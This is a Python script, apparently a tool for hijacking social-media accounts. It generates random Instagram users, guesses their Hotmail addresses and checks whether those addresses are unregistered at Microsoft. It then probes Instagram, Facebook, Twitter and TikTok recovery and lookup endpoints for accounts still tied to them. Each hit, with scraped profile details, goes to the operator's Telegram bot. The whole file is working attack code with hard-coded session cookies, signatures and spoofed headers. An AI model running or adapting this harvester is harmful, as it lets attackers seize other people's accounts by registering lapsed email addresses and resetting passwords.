import os
import requests
import json
import random
import random
import requests
import urllib.request
import uuid
import threading
import os
from uuid import uuid4
from user_agent import generate_user_agent
from secrets import token_hex
from rich.console import Console
from rich.table import Table
from OneClick import *
from AegosPy import GetInfoInsta
import mechanize
#from mahos import Hit


HFP = 0
NFP = 0
HIG = 0
NIG = 0
HTW = 0
NTW = 0
NTIK = 0
HTIK = 0







mahos = token_hex(8) * 2
csr = token_hex(8) * 2
mazen = token_hex(8).upper()   
abood = token_hex(8).upper()  
uid = uuid.uuid4()
DvD = "android-" + str(uuid.uuid4())
lopp = str(uuid.uuid4())
Lol = str(uuid.uuid4())
Gio = str(uuid.uuid4())

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'  # ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

print(f'''{B}{E}=============================={B}
|{F}[+] YouTube    : {B}|أحمد الحراني 
|{F}[+] TeleGram  : {B} maho_s9    |
|{F}[+] Instagram  : {B}ahmedalharrani |
|{F}[+] Tool  : {B}متاحات  |
{E}==============================''')

token = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  ' + Z)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F}  ' + Z)




def cls():
    os.system('cls' if os.name == 'nt' else 'clear')













def TikTok(email):
    global NTIK, HTIK
    
    url = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A%22ios%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Fprofile%22%2C%22root_referer%22%3A%22https%3A%2F%2Fwww.google.com%22%2C%22cookie_enabled%22%3Atrue%2C%22screen_width%22%3A390%2C%22screen_height%22%3A844%2C%22browser_language%22%3A%22en-us%22%2C%22browser_platform%22%3A%22iPhone%22%2C%22browser_name%22%3A%22Mozilla%22%2C%22browser_version%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2014_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version%2F14.0.3%20Mobile%2F15E148%20Safari%2F604.1%22%2C%22browser_online%22%3Atrue%2C%22timezone_name%22%3A%22Asia%2FRiyadh%22%2C%22is_page_visible%22%3Atrue%2C%22focus_state%22%3Atrue%2C%22is_fullscreen%22%3Afalse%2C%22history_len%22%3A17%2C%22battery_info%22%3A%7B%7D%7D&msToken=vPgBDLGXZNEf56bl_V4J6muu5nAYCQi5dA6zj49IuWrw2DwDUZELsX2wz2_2ZYtzkbUF9UyblyjQTsIDI5cclvJQ6sZA-lHqzKS1gLIJD9M6LDBgII0nxKqCfwwVstZxhpppXA==&X-Bogus=DFSzsIVLC8A-dJf6SXgssmuyRsO1&_signature=_02B4Z6wo00001dTdX3QAAIDBDn9.7WbolA3U3FvAABfU8c"

    data = (f"email={email}&aid=1459&language=en&account_sdk_source=web&region=SA")

    hed = {
        "User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
    }
    r = requests.post(url, headers=hed, data=data).text
    if '"data":{"is_registered":1},"message":"success"' in r:
        HTIK += 1
        cls()
        print(f'''
[1] {F}Available FaceBook√{F}  ⇾ {HFP}  | {Z}NotAvailable Facebook*{Z} ⇾ {NFP}
{A}════════════════════════════════════════
[2] {F}Available Instagram√{F} ⇾ {HIG}   | {Z}NotAvailable Instagram*{Z} ⇾ {NIG}
{X}════════════════════════════════════════
[3] {F}Available Twitter√{F} ⇾ {HTW}   | {Z}NotAvailable Twitter*{Z} ⇾ {NTW}
{A}════════════════════════════════════════
[4] {F}Available TikTok√{F} ⇾ {HTIK}   | {Z}NotAvailable TikTok*{Z} ⇾ {NTIK}
{X}════════════════════════════════════════
[5] {G}Email ⇾ {email} | 
════════════════════════════════════════''')
        fm = email.split('@')[0]
        url = 'http://tik.report.ilebo.cc/users/login'
        headers = {
            'User-Agent': generate_user_agent(),
            'Accept-Language': 'en-US',
            'Content-Type': 'application/json; charset=utf-8',
            'Content-Length': '73',
            'Host': 'tik.report.ilebo.cc',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        data = {
            'unique_id': fm,
            'purchaseTokens': []
        }
        response = requests.post(url, headers=headers, json=data).json()
        user_data = response['data']['user']['user']
        stats = response['data']['user']['stats']
        a_user_data = response['data']['aUser']       
        name = user_data['nickname']
        followers = stats['followerCount']
        following = stats['followingCount']
        likes = stats['heartCount']
        videos = stats['videoCount']
        age = user_data['underAge18']
        priv = user_data['privateAccount']
        sec_uid = user_data.get('secUid', '')
        bio = user_data.get('signature', '')

        message = f'''
═════════𝚃𝙸𝙺𝚃𝙾𝙺════
═══════════
𝐍𝐀𝐌𝐄 ⇾ {name}
𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 ⇾ {fm}
EMAIL: {email}
𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 ⇾ {followers}
𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 ⇾ {following}
𝐋𝐈𝐊𝐄𝐒 ⇾ {likes}
𝐕𝐈𝐃𝐄𝐎 ⇾ {videos}
𝐀𝐆𝐄 ⇾ {age}
𝐏𝐑𝐈𝐕𝐓𝐄𝐒 ⇾ {priv}
𝐒𝐄𝐂𝐔𝐈𝐃 ⇾ {sec_uid}
𝐁𝐈𝐎 ⇾ {bio}
URL ⇾ https://www.tiktok.com/@{fm}
═════════𝚃𝙸𝙺𝚃𝙾𝙺═══════════
𝙳𝙴𝚅: @maho_s9 | @maho9s
'''
        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}')
    else:
        NTIK += 1
        cls()
        print(f'''
[1] {F}Available FaceBook√{F}  ⇾ {HFP}  | {Z}NotAvailable Facebook*{Z} ⇾ {NFP}
{A}════════════════════════════════════════
[2] {F}Available Instagram√{F} ⇾ {HIG}   | {Z}NotAvailable Instagram*{Z} ⇾ {NIG}
{X}════════════════════════════════════════
[3] {F}Available Twitter√{F} ⇾ {HTW}   | {Z}NotAvailable Twitter*{Z} ⇾ {NTW}
{A}════════════════════════════════════════
[4] {F}Available TikTok√{F} ⇾ {HTIK}   | {Z}NotAvailable TikTok*{Z} ⇾ {NTIK}
{X}════════════════════════════════════════
[5] {G}Email ⇾ {email} | 
════════════════════════════════════════''')





def Facebook(email):
    global HFP, NFP

    cookies = {
        'datr': '_N31ZWo3s4D6x1FdO9uG4Q8y',
        'sb': '_N31ZShG0meLNN14VzELnn2J',
        'm_pixel_ratio': '2',
        'wd': '360x690',
        'fr': '0Et8aSrbVYjg6xcyI..Bl9d38..AAA.0.0.Bl9d4H.AWWfJuCJBio',
        'ps_l': '0',
        'ps_n': '0',
    }

    headers = {
        'authority': 'd.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',    
        'dpr': '2',
        'origin': 'https://d.facebook.com',
        'referer': 'https://d.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"ART-L29N"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'viewport-width': '980',
    }

    params = {
        'ctx': 'recover',
        'c': '/login/',
        'search_attempts': '1',
        'ars': 'facebook_login',
        'alternate_search': '1',
        'show_friend_search_filtered_list': '0',
        'birth_month_search': '0',
        'city_search': '0',
    }

    data = {
        'lsd': 'AVrFwzIB6bM',
        'jazoest': '2944',
        'email': email,
        'did_submit': 'بحث',
    }

    rr = requests.post('https://d.facebook.com/login/identify/', params=params, cookies=cookies, headers=headers, data=data).text
    user = email.split('@')[0]
    if f'send it to {user}' in rr or 'سنرسله الى' in rr or f'{user}' in rr:
        HFP += 1
        cls()
        print(f'''
[1] {F}Available FaceBook√{F}  ⇾ {HFP}  | {Z}NotAvailable Facebook*{Z} ⇾ {NFP}
{A}════════════════════════════════════════
[2] {F}Available Instagram√{F} ⇾ {HIG}   | {Z}NotAvailable Instagram*{Z} ⇾ {NIG}
{X}════════════════════════════════════════
[3] {F}Available Twitter√{F} ⇾ {HTW}   | {Z}NotAvailable Twitter*{Z} ⇾ {NTW}
{A}════════════════════════════════════════
[4] {F}Available TikTok√{F} ⇾ {HTIK}   | {Z}NotAvailable TikTok*{Z} ⇾ {NTIK}
{X}════════════════════════════════════════
[5] {G}Email ⇾ {email} | 
════════════════════════════════════════''')
        tlg = (f"""
مهوس يحبك وجاب لك متاح فيسبوك
⋘─────━*مهوس*━─────⋙
 Email >> {email}
⋘─────━FACEBOOK━─────⋙
BY :  @maho_s9 | @maho9s
""")
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    else:
        NFP += 1
        cls()
        print(f'''
[1] {F}Available FaceBook√{F}  ⇾ {HFP}  | {Z}NotAvailable Facebook*{Z} ⇾ {NFP}
{A}════════════════════════════════════════
[2] {F}Available Instagram√{F} ⇾ {HIG}   | {Z}NotAvailable Instagram*{Z} ⇾ {NIG}
{X}════════════════════════════════════════
[3] {F}Available Twitter√{F} ⇾ {HTW}   | {Z}NotAvailable Twitter*{Z} ⇾ {NTW}
{A}════════════════════════════════════════
[4] {F}Available TikTok√{F} ⇾ {HTIK}   | {Z}NotAvailable TikTok*{Z} ⇾ {NTIK}
{X}════════════════════════════════════════
[5] {G}Email ⇾ {email} | 
════════════════════════════════════════''')







def Twitter(email):
    global HTW, NTW
    url = "https://api.twitter.com/i/users/email_available.json?email=" + email

    headers = {
        'User-Agent': generate_user_agent(),
        'Host': 'api.twitter.com',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    }

    req = requests.get(url, headers=headers).text
    if '{"valid":false,"msg":"Email has already been taken.","taken":true}' in req:
        HTW += 1
        cls()
        print(f'''
[1] {F}Available FaceBook√{F}  ⇾ {HFP}  | {Z}NotAvailable Facebook*{Z} ⇾ {NFP}
{A}════════════════════════════════════════
[2] {F}Available Instagram√{F} ⇾ {HIG}   | {Z}NotAvailable Instagram*{Z} ⇾ {NIG}
{X}════════════════════════════════════════
[3] {F}Available Twitter√{F} ⇾ {HTW}   | {Z}NotAvailable Twitter*{Z} ⇾ {NTW}
{A}════════════════════════════════════════
[4] {F}Available TikTok√{F} ⇾ {HTIK}   | {Z}NotAvailable TikTok*{Z} ⇾{NTIK}
{X}════════════════════════════════════════
[5] {G}Email ⇾ {email} | 
════════════════════════════════════════''')
        tlg = (f'''
            مهوس يحبك وجاب لك متاح تويتر
                     ⋘─────━*مهوس*━─────⋙
            Email >> {email} 
            ⋘─────━❤️🌚━─────⋙
            𝐁𝐘 :  @maho_s9 | @maho9s
            ''')
        requests.get("https://api.telegram.org/bot" + str(token) + "/sendMessage?chat_id=" + str(ID) + "&text=" + str(tlg))

    else:
        NTW += 1
        cls()
        print(f'''
[1] {F}Available FaceBook√{F}  ⇾ {HFP}  | {Z}NotAvailable Facebook*{Z} ⇾ {NFP}
{A}════════════════════════════════════════
[2] {F}Available Instagram√{F} ⇾ {HIG}   | {Z}NotAvailable Instagram*{Z} ⇾ {NIG}
{X}════════════════════════════════════════
[3] {F}Available Twitter√{F} ⇾ {HTW}   | {Z}NotAvailable Twitter*{Z} ⇾ {NTW}
{A}════════════════════════════════════════
[4] {F}Available TikTok√{F} ⇾ {HTIK}   | {Z}NotAvailable TikTok*{Z} ⇾{NTIK}
{X}════════════════════════════════════════
[5] {G}Email ⇾ {email} | 
════════════════════════════════════════''')



def Instagram(email):
    global HIG, NIG
    
    headers = {
        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }
    
    data = {
        f'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}',
        'ig_sig_key_version': '4',
    }
    
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
    
    if '"status":"ok"' in response:
        HIG += 1
        cls()
        print(f'''
[1] {F}Available FaceBook√{F}  ⇾ {HFP}  | {Z}NotAvailable Facebook*{Z} ⇾ {NFP}
{A}════════════════════════════════════════
[2] {F}Available Instagram√{F} ⇾ {HIG}   | {Z}NotAvailable Instagram*{Z} ⇾ {NIG}
{X}════════════════════════════════════════
[3] {F}Available Twitter√{F} ⇾ {HTW}   | {Z}NotAvailable Twitter*{Z} ⇾ {NTW}
{A}════════════════════════════════════════
[4] {F}Available TikTok√{F} ⇾ {HTIK}   | {Z}NotAvailable TikTok*{Z} ⇾{NTIK}
{X}════════════════════════════════════════
[5] {G}Email ⇾ {email} | 
════════════════════════════════════════''')
        user = email.split('@')[0]
        Response = GetInfoInsta(user)
        Name = Response['name']
        Id = Response['id']                    
        flos = Response['followers']
        flog = Response['following']
        po = Response['posts']
        da = Response['date']                  

        message = (f"""
        مهوس يحبك وجاب لك متاح انستاجرام
        ⋘─────━*مهوس*━─────⋙
         Name >> {Name}
         Username >> @{user}
         Email >> {email}
         ID >> {Id}
         Followers >> {flos}
         Following >> {flog}
         Post >> {po}
         Date >> {da}
         Rest >> Done Send .!
         Url >>  https://www.instagram.com/{user}
        ⋘─────━❤️🌚━─────⋙
        𝐁𝐘 :  @maho_s9 | @maho9s""")

        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}')

    else:
        NIG += 1
        cls()
        print(f'''
[1] {F}Available FaceBook√{F}  ⇾ {HFP}  | {Z}NotAvailable Facebook*{Z} ⇾ {NFP}
{A}════════════════════════════════════════
[2] {F}Available Instagram√{F} ⇾ {HIG}   | {Z}NotAvailable Instagram*{Z} ⇾ {NIG}
{X}════════════════════════════════════════
[3] {F}Available Twitter√{F} ⇾ {HTW}   | {Z}NotAvailable Twitter*{Z} ⇾ {NTW}
{A}════════════════════════════════════════
[4] {F}Available TikTok√{F} ⇾ {HTIK}   | {Z}NotAvailable TikTok*{Z} ⇾{NTIK}
{X}════════════════════════════════════════
[5] {G}Email ⇾ {email} | 
════════════════════════════════════════''')


def Check(email):
    cookies = {
        'mkt': 'ar-SA',
        'mkt1': 'ar-SA',
        'amsc': '4tWjLhQBQrUJ84ZuWlqjwhUFrmxYsrxqjydoTjJLqqApRzGN1lLYac/6XNdfLn6THZM+QfgmyU6vDcf5qK9VJujzBeO0d6+HZ6vAmfb4D26rkWaADJlO3wk84XaqgpV9gR6uYsxHAfE8QZ2QwpiRFnve/9qUAaD5jyLz7zto78lfBsLDc2X2hYvgGssJp+zZvRxp1mFxgDLuE46hUgfZ5bo3404dbZ5oxHv36hTYnZMs4VuSc+S/DQGSVxHT9NpJWldJ51GAdiGj2+b6C5bN/raujj/YHhOnDP93cGd5CUU=:2:3c',
        'MicrosoftApplicationsTelemetryDeviceId': '{uid}', 
        'MUID': '{mahos}', 
        'clrc': '{%2219799%22%3a[%22+VC+x0R6%22%2c%22d7PFy/1V%22%2c%22FutSZdvn%22]}',
        'ai_session': 'y/83BdS0lkSPwRH0CAH6Xz|1710624096951|1710624096951',
        'fptctx2': 'taBcrIH61PuCVH7eNCyH0AHEYHVht29NHm46S5qgUjYoCfxYfJh44yRWEUS9sQx0afgyOjX8uTyWpzZuxfpW%252bluBDTvlTz%252b79hQqOt8nFOoOTw0W2XITph3Qo9gW5ZVPc2ojXZUcHgxXjGX%252bzLg5B5o99QybCNQRreAvDFb0h4lWLT2wvMnJf28AJ3H1U37rWLPFig6HyrtKrQ3zGPf7CnQGjP5iL4hi%252f4qQBS%252f0ybCn5ZP4tmlod7yM7uqdPQdY06bp77H%252fE8n7Bd2KKvENVVHKFL4IU5eLUzruhuRT2O3kxSRfPn%252fNpDgIW60lo1JhGZeg1zOuQoehRi8QyUds%252fA%253d%253d',
    }

    headers = {
        'authority': 'signup.live.com',
        'accept': 'application/json',
        'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
        'canary': 'oLz2XBnMdgrh+jrGOk1E0Scd0fJBQTCv4kCNU8YJwvm5LFPWjcB5a7M9lyfnF3AIZkjS01IHOxy+eV8lfjtLQGootUN7fS16IIGVfgW5tCd+gKITr5lW4lj/FLBozzzoYFQOVqJn1+M+9uSEYXrBeKM7LxpEc3FnbC7nv/CPd6XHLZ96Z+ZsS5Q5O7DgcKw02XI0ItC8R74Lmwy5lrZY9WIf5jPor1toA+9vn7s5zI9EaKiXKjY38Y08G7KdJJPp:2:3c',
        'content-type': 'application/json',
        'hpgid': '200639',
        'origin': 'https://signup.live.com',
        'referer': f'https://signup.live.com/signup?id=74335&contextid={mazen}&opid={abood}&bk=1710624083&sru=https://login.live.com/login.srf%3fid%3d74335%26id%3d74335%26contextid%3d{mazen}%26opid%3d{abood}%26mkt%3dAR-SA%26lc%3d1025%26bk%3d1710624083%26uaid%3d{lopp}&uiflavor=web&lic=1&mkt=AR-SA&lc=1025&uaid={lopp}',
        'scid': '100118',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'tcxt': 'UuPsECiRS8/Hz0E9Uo0udBcARadtxSWDLDM+ieZ3ZpkQdAEb/fdCYBXU7R5NOwr+6gcnVj/fHBXS+WbnrmWxjRgfpt+IRGK8sizhi0NkO+MghiAeBW/aQTs9jeEYljcIxYEDrd7PuTQelqn/xowvAw3og8FZT64l+s8FIBfTCMHTGKa8qJRHBg8QhHR6FkElPsYsOGhzPtu8TBKgO7o4NoYmEfQAthzTW4tf8XIuu5LlFl+tEQ4RVSjrIoKWDQaEle1q3N8vrs7rd3buRgEe2fQf3MBmrdSM/jF1XYENwTk902rRuuOC1AqYD2hl6bPF8pBAYxkJ5dE9pJHZR9bR0+AkRrYwoaVF8hW2MIEZZ5muWtwtogeSx33rcnvKuhVoWd1GF34BpWzky1MYw3pho/He7eW7/8Df6ODrcbyVu2rPwgZGMCPWNZyc0JICX7Ss0F9dlw1yJCna57uoRIMdLWlnCno1KA5zcgojAJW+5gLDAkafCS/cTo0eUMXk0d35KFi7ggIspPqWeRqiNC15RL7mDahc3HOaJhMeZnlvWfMyokYfho/LN7KMmyeTQyfGh/qOxYVy44+/p4fQmhR8jw==:2:3',
        'uaid': lopp,
        'uiflvr': '1001',
        'user-agent': generate_user_agent(),
        'x-ms-apitransport': 'xhr',
        'x-ms-apiversion': '2',
    }

    json_data = {
        'signInName': email,
        'uaid': lopp,
        'includeSuggestions': True,
        'uiflvr': 1001,
        'scid': 100118,
        'hpgid': 200639,
    }

    res = requests.post(
        f'https://signup.live.com/API/CheckAvailableSigninNames?id=74335&contextid={mazen}&opid={abood}&bk=1710624083&sru=https://login.live.com/login.srf%3fid%3d74335%26id%3d74335%26contextid%3d{mazen}%26opid%3d{abood}%26mkt%3dAR-SA%26lc%3d1025%26bk%3d1710624083%26uaid%3d{lopp}&uiflavor=web&lic=1&mkt=AR-SA&lc=1025&uaid={lopp}',
        cookies=cookies,
        headers=headers,
        json=json_data,
    ).text
    
    if '"isAvailable":true' in res:
        Instagram(email)
        Twitter(email)
        Facebook(email)
        TikTok(email)
    else:
        print("")





def Search():
    while True:
        ffd = int("".join(random.choice('345678') for i in range(1)))
        re = "".join(random.choice('1234567890') for i in range(ffd))
        url = f'http://i.instagram.com/api/v1/users/{re}/info/'
        headers = {
            'Host': 'i.instagram.com',
            'Connection': 'Keep-Alive',
            'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; en_IQ)',
            'Accept-Language': 'en-IQ, en-US',
            'X-IG-Connection-Type': 'MOBILE(LTE)',
            'X-IG-Capabilities': 'AQ==',
            'Accept-Encoding': 'gzip',
        }
        rr = requests.get(url, headers=headers).text
        if 'User not found' in rr:
            print(" ")
            continue
        else:
            rre = json.loads(rr)
            user = rre['user']['username']
            email = user + "@hotmail.com"
            Check(email)

Search()